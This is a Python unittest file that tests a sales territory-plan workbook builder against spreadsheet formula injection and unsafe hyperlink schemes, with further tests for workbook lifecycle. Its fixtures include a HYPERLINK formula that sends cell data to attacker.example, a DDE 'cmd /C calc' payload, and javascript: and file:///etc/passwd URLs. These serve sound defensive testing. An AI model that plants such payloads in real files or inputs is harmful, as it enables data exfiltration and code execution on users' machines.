"""Regression tests for the territory-plan workbook builder.

The formula cases come from the 2026-08-10 security audit: openpyxl types a
leading "=" as a formula, so a prospect name lifted from a community message
could ship as executable content inside a workbook a rep opens. These tests
assert the property that matters -- zero formula elements in the saved file --
rather than the implementation that currently delivers it.

    python3 -m unittest discover -s tests
"""
import re
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent
                      / "skills/weekly-territory-plan/assets"))

from openpyxl import load_workbook  # noqa: E402

from pg_plan_builder import add_week  # noqa: E402

WEEK = "WEEK 1  (week of 2026-08-17)"

# Every one of these is a plausible value for a name, title or note: they arrive
# from LinkedIn profiles, community messages and model-written drafts.
HOSTILE = [
    '=HYPERLINK("http://attacker.example/?d="&A1,"Open")',
    "@SUM(A1)",
    "-cmd|' /C calc'!A0",
    "+1+1",
    "=1+1",
]


def contact(**overrides):
    base = {
        "name": "Jane Doe",
        "title": "Director, Platform",
        "email": "",
        "phone": "",
        "linkedin": "",
        "notes": "",
    }
    base.update(overrides)
    return base


class WorkbookSafetyTests(unittest.TestCase):
    def setUp(self):
        self._dir = tempfile.TemporaryDirectory()
        self.path = Path(self._dir.name) / "plan.xlsx"

    def tearDown(self):
        self._dir.cleanup()

    def build(self, contacts, account_name="Northwind", label=WEEK):
        add_week(path=str(self.path), week_label=label,
                 accounts=[{"name": account_name, "contacts": contacts}])
        return load_workbook(self.path).active

    def sheet_xml(self):
        with zipfile.ZipFile(self.path) as archive:
            return archive.read("xl/worksheets/sheet1.xml").decode()

    def test_no_formula_survives_any_field(self):
        contacts = [contact(name=v, title=v, notes=v, phone=v) for v in HOSTILE]
        self.build(contacts, account_name=HOSTILE[0])
        self.assertEqual(re.findall(r"<f>", self.sheet_xml()), [],
                         "a cell was written as a formula")

    def test_hostile_values_survive_as_readable_text(self):
        """Neutralised, not mangled -- the rep still sees what the source said."""
        sheet = self.build([contact(name=HOSTILE[0])])
        written = [c.value for row in sheet.iter_rows() for c in row if c.value]
        self.assertIn(HOSTILE[0], written)

    def test_every_written_cell_is_string_typed(self):
        self.build([contact(name=HOSTILE[0], notes=HOSTILE[2])])
        for row in load_workbook(self.path).active.iter_rows():
            for cell in row:
                if cell.value not in (None, ""):
                    self.assertEqual(cell.data_type, "s", f"{cell.coordinate} not text")

    def test_phone_is_not_disfigured(self):
        """The xlsx path must not borrow the CSV apostrophe: phones lead with +."""
        sheet = self.build([contact(phone="+15551234567")])
        phones = [c.value for row in sheet.iter_rows() for c in row
                  if c.value and str(c.value).startswith(("+", "'"))]
        self.assertEqual(phones, ["+15551234567"])


class HyperlinkTests(unittest.TestCase):
    def setUp(self):
        self._dir = tempfile.TemporaryDirectory()
        self.path = Path(self._dir.name) / "plan.xlsx"

    def tearDown(self):
        self._dir.cleanup()

    def link_for(self, linkedin):
        add_week(path=str(self.path), week_label=WEEK, accounts=[
            {"name": "Northwind", "contacts": [contact(linkedin=linkedin)]}])
        sheet = load_workbook(self.path).active
        for row in sheet.iter_rows():
            for cell in row:
                if cell.hyperlink:
                    return cell.hyperlink.target
        return None

    def test_bare_domain_gets_https(self):
        self.assertEqual(self.link_for("linkedin.com/in/example-person-04"),
                         "https://linkedin.com/in/example-person-04")

    def test_https_url_passes_through(self):
        url = "https://linkedin.com/in/example-person-04"
        self.assertEqual(self.link_for(url), url)

    def test_foreign_scheme_is_not_linked(self):
        for hostile in ("javascript:alert(1)", "file:///etc/passwd", "data:text/html,x"):
            with self.subTest(hostile=hostile):
                self.assertIsNone(self.link_for(hostile))

    def test_empty_is_not_linked(self):
        self.assertIsNone(self.link_for(""))


class WorkbookLifecycleTests(unittest.TestCase):
    def setUp(self):
        self._dir = tempfile.TemporaryDirectory()
        self.path = Path(self._dir.name) / "plan.xlsx"

    def tearDown(self):
        self._dir.cleanup()

    def accounts(self):
        return [{"name": "Northwind", "contacts": [contact()]}]

    def test_second_run_same_label_is_a_noop(self):
        self.assertTrue(add_week(path=str(self.path), week_label=WEEK,
                                 accounts=self.accounts()))
        self.assertFalse(add_week(path=str(self.path), week_label=WEEK,
                                  accounts=self.accounts()),
                         "re-running the same week duplicated the block")

    def test_next_week_appends(self):
        add_week(path=str(self.path), week_label=WEEK, accounts=self.accounts())
        first = load_workbook(self.path).active.max_row
        self.assertTrue(add_week(path=str(self.path), week_label="WEEK 2",
                                 accounts=self.accounts()))
        self.assertGreater(load_workbook(self.path).active.max_row, first)

    def test_non_xlsx_path_is_refused(self):
        """A wrong path silently grafts a rep's week onto an unrelated file."""
        with self.assertRaises(ValueError):
            add_week(path=str(Path(self._dir.name) / "notes.txt"),
                     week_label=WEEK, accounts=self.accounts())

    def test_directory_path_is_refused(self):
        target = Path(self._dir.name) / "a.xlsx"
        target.mkdir()
        with self.assertRaises(ValueError):
            add_week(path=str(target), week_label=WEEK, accounts=self.accounts())

    def test_touchpoint_count_is_enforced(self):
        with self.assertRaises(ValueError):
            add_week(path=str(self.path), week_label=WEEK,
                     accounts=self.accounts(), touchpoints=["only", "two"])


if __name__ == "__main__":
    unittest.main()
